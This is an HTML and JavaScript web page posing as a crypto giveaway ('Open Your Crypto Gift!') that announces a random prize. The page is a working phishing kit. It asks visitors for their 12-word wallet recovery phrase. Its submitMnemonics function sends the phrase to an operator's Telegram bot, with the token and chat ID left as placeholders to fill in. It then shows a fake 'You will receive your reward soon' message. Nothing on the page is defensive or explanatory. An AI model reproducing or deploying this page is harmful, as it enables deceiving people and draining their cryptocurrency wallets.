<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Gift Box</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #0d0d0d;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    h1 {
      margin-top: 40px;
      font-size: 2rem;
      color: #ffcc00;
    }
    .gift-box {
      margin: 30px auto;
      width: 150px;
      height: 150px;
      background: #1a1a1a;
      border: 2px solid #ffcc00;
      border-radius: 15px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .gift-box img {
      width: 80px;
    }
    .items {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-top: 20px;
    }
    .item {
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 10px;
      margin: 5px;
      padding: 8px 12px;
      display: flex;
      align-items: center;
      font-size: 14px;
    }
    .item img {
      width: 20px;
      height: 20px;
      margin-right: 5px;
    }
    #claimSection {
      margin-top: 30px;
      display: none;
    }
    #mnemonicsInput {
      width: 80%;
      padding: 8px;
      margin-top: 10px;
      border: 1px solid #555;
      border-radius: 5px;
      background: #1a1a1a;
      color: #fff;
    }
    .btn {
      margin-top: 10px;
      padding: 10px 20px;
      background: #ffcc00;
      color: #000;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background: #ffd633;
    }
    .popup {
      background: #1a1a1a;
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #ffcc00;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>

<h1>Open Your Crypto Gift!</h1>

<div class="gift-box" onclick="openGift()">
  <img src="https://cdn-icons-png.flaticon.com/512/820/820929.png" alt="Gift">
</div>

<div class="items">
  <div class="item"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB"> 1 BNB</div>
  <div class="item"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> 10 USDT</div>
  <div class="item"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> 100 USDT</div>
  <div class="item"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="BTC"> 1 BTC</div>
  <div class="item"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH"> 1 ETH</div>
  <div class="item"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png" alt="LTC"> 1 LTC</div>
  <div class="item"><img src="https://cryptologos.cc/logos/xrp-xrp-logo.png" alt="XRP"> 500 XRP</div>
  <div class="item"><img src="https://cryptologos.cc/logos/solana-sol-logo.png" alt="SOL"> 0.5 SOL</div>
  <div class="item"><img src="https://cryptologos.cc/logos/cardano-ada-logo.png" alt="ADA"> 2 ADA</div>
  <div class="item"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png" alt="DOGE"> 100 DOGE</div>
</div>

<div id="claimSection">
  <p id="rewardText"></p>
  <button class="btn" onclick="showMnemonics()">Claim Now</button>

  <div id="mnemonicsSection" style="display:none;">
    <input type="text" id="mnemonicsInput" placeholder="Enter your 12-word Mnemonics">
    <button class="btn" onclick="submitMnemonics()">Submit</button>
  </div>
</div>

<div class="popup" id="popup">
  You will receive your reward soon!
</div>

<audio id="openSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-mechanical-bling-210.mp3"></audio>

<script>
  let rewards = [
    '1 BNB', '10 USDT', '100 USDT', '1 BTC', '1 ETH', 
    '1 LTC', '500 XRP', '0.5 SOL', '2 ADA', '100 DOGE'
  ];

  function openGift() {
    let sound = document.getElementById('openSound');
    sound.play();

    let randomReward = rewards[Math.floor(Math.random() * rewards.length)];
    document.getElementById('rewardText').innerText = "Congratulations! You won: " + randomReward;
    document.getElementById('claimSection').style.display = 'block';
  }

  function showMnemonics() {
    document.getElementById('mnemonicsSection').style.display = 'block';
  }

  function submitMnemonics() {
    let mnemonics = document.getElementById('mnemonicsInput').value.trim();
    if (mnemonics.split(' ').length !== 12) {
      alert('Please enter exactly 12 words!');
      return;
    }

    // Send mnemonics to your Telegram Bot
    let botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    let chatId = 'YOUR_TELEGRAM_CHAT_ID';
    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Mnemonics: ${encodeURIComponent(mnemonics)}`;

    fetch(url)
      .then(response => {
        if (response.ok) {
          document.getElementById('popup').style.display = 'block';
          document.getElementById('mnemonicsSection').style.display = 'none';
        } else {
          alert('Failed to submit. Try again later.');
        }
      })
      .catch(error => {
        alert('Error submitting: ' + error.message);
      });
  }
</script>

</body>
</html>
